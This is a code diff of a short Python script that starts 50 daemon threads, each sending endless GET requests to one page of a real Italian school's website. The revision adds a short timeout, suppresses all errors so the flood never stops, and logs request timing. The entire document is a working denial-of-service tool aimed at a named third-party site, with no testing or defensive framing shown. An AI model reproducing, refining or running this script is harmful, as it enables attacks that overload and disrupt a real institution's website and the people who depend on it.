@@ -1,23 +1,28 @@
-import requests, threading
+import requests, threading, time
 
-i=1
-
-def do_request():
-    global i
-    while True:
-        r = requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01")
-        i=i+1
-        print(i)
+I=0
+nThreads = 50
 
 threads = []
 
-for i in range(50):
+def do_request():
+    global I
+    while True:
+        t1 = time.time()
+        try:
+            requests.get("https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01", timeout=1)
+        except:
+            pass
+        I=I+1
+        print(f'Req n:{I} took: {time.time() - t1} s')
+
+for _ in range(nThreads):
     t = threading.Thread(target=do_request)
     t.daemon = True
     threads.append(t)
 
-for i in range(50):
-    threads[i].start()
+for y in range(nThreads):
+    threads[y].start()
 
-for i in range(50):
-    threads[i].join()
+for y in range(nThreads):
+    threads[y].join()
